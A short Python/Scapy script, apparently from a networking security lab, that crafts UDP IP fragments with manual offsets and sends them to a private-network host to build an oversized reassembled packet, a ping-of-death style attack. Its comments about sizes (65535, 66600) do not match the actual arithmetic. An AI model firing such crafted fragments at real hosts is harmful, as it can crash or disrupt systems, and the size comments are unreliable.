#!/usr/bin/python3
from scapy.all import *
ID = 2025
DST_MAC = "08:00:27:05:41:63"
payload1,payload2,payload3  = "A" * 1472,"B" * 1480,"C" * 1480
ether = Ether(dst = DST_MAC)
ip = IP(src="10.0.2.4", dst="10.0.2.6")
ip.proto = 17 #udp protocol
ip.id = ID #identifier of fragment
n = 7
#1st fragment has udp header!!!!!!!!!!!!!
udp = UDP(sport=7070, dport=9090)
udp.len = 8 + 1472 + 1480*(n+1) #max = 65535; MTU = 1500; 20 IP, 8 UDP
ip.frag = 0 #fragmentation index of start
ip.flags = 1 #more fragments
pkt = ether/ip/udp/payload1
pkt[UDP].chksum = 0 #optional for udp but need to be zero scappy do it for us if we don't specify it
sendp(pkt,verbose=0)
print(payload1, end="")
#2nd fragment!!!!!!!!!!!!!!!!
for i in range(n):
    ip.frag += 185
    ip.flags = 1 #more fragments
    pkt = ether/ip/payload2
    sendp(pkt,verbose=0)
#3rd fragment!!!!!!!!!!!!!!!!!
ip.frag = 185 * (n+1) #(8+16+16) / 8 = fragment3 start index
ip.flags = 0 #no more fragments
pkt = ether/ip/payload3
sendp(pkt,verbose=0)
print(payload3)
#we're sanding 66600